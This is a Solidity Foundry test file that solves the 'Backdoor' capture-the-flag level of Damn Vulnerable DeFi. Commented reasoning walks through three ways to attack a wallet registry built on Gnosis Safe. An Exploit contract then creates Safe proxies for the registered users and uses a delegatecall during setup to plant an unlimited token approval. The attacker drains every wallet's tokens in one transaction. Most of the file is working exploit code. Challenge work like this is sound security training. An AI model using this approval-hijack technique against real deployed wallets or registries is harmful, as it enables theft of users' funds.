// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal player;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        player = payable(address(uint160(uint256(keccak256(abi.encodePacked("Player"))))));
        vm.label(player, "Player");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        assertEq(walletRegistry.owner() , address(this));

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(keccak256("Unauthorized()")));
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(player, player);
        
        // The idea is to create 4 wallets associated to each user using createProxyWithNonce of the factory. This will allow the registry to send back 10 tokens to each wallet, and at the same time add each SINGLE user as beneficiary. To be able to initiate any user as the owner of a wallet, the setup() function of the GnosisSafe masterCopy contract needs to be called. Calling it simply will definitely set up the owners. 
        // However, we need to do something more. We need to be able to send the tokens from each wallet to the player account. As the function setup is set up now, there are 3 ways to pull this off :

        // 1: Set up the fallbackHandler in the setup, create the proxy wallet. After receiving the funds from the WalletRegistry. Send another tx with calldata to the proxy which should fallback to the gnosisSafe and triggers the fallback function of the FallbackManager which executes a low level CALL to the handler by calling the function defined in the calldata. The solution would be to set the fallbackHandler as the address of the DamnValuableToken token contract. After the create is complete, send a tx call to the proxy with calldata equal to the selector of the transfer function to the recipient which is the player. 
        // @note This solution would not work due to this condition inside the WalletRegistry :         
        // address fallbackManager = _getFallbackManager(walletAddress);
        // if (fallbackManager != address(0))
        // revert InvalidFallbackManager(fallbackManager);
        // Let's check other ways :

        // 2nd solution : This would require to create the wallets with 2 owners instead of one. One being the original users and the second owner would be the player for each wallet. After the creation, the player would need to immediately sign a tx to send the tokens from the newly created wallets to his account.
        // @note This solution would require the user to send more than 1 tx, but we expect only 1 tx for this level. 

        // 3rd solution : The setup() function calls setupModules(to, data); which executes :
        // require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000"); in the moduleManager and in return the execute() function does this :
        // success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0) in the Executor contract.
        // We can have setup() do the delegate call as long as to # address(0) and the data make sense. Since this will do a delegate call, the calls will be executed in the context of the proxy. Also this delegateCall will happen BEFORE the tokens are transfered to the wallet. The only way to transfer the tokens after they are received is to make the wallet approve our address. To pull this off, we will have the proxy, when calling setup, delegate to our contract which has a function that calls token.approve() with the player address and the wallet token balance as arguments. Then when the registry sends the funds to the proxy wallet, we can safely calls transferfrom to send the funds from the proxy to us.

        Exploit exploit  = new Exploit(walletRegistry, walletFactory, dvt, address(masterCopy), users);
        exploit.createProxiesAndTransferFunds();

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        assertEq(vm.getNonce(player), 1);

        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Player must have taken all tokens
        assertEq(dvt.balanceOf(player), AMOUNT_TOKENS_DISTRIBUTED);
    }
}


contract Exploit {

    WalletRegistry walletRegistry;
    GnosisSafeProxyFactory walletFactory;
    DamnValuableToken dvt;
    address masterCopy;
    address player;
    address[] internal users;
    uint256 internal constant NUM_USERS = 4;

    constructor(WalletRegistry _walletRegistry,
        GnosisSafeProxyFactory _walletFactory,
        DamnValuableToken _dvt,
        address _masterCopy, address[] memory _users) {
            player = msg.sender;
            walletRegistry = _walletRegistry;
            walletFactory = _walletFactory;
            dvt = _dvt;
            masterCopy = _masterCopy;
            users = _users;
        }

    function createProxiesAndTransferFunds() external {
        address[] memory oneUser = new address[](1);
        GnosisSafe wallet;

        for(uint256 i=0; i< NUM_USERS; i++){

        oneUser[0] = users[i];
        bytes memory initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector, 
            oneUser, 
            uint256(1), 
            address(this), 
            abi.encodeWithSelector(this.callApproveViaDelegate.selector, address(this), dvt), 
            address(0), 
            address(0), 
            0, 
            address(0)
        );
        wallet = GnosisSafe(payable(address(walletFactory.createProxyWithCallback(masterCopy, initializer , 0, walletRegistry))));
        
        dvt.transferFrom(address(wallet), player, dvt.balanceOf(address(wallet)));
        }

    }

    function callApproveViaDelegate(address instance, DamnValuableToken token) external {
        token.approve(instance, type(uint256).max);
    }

}
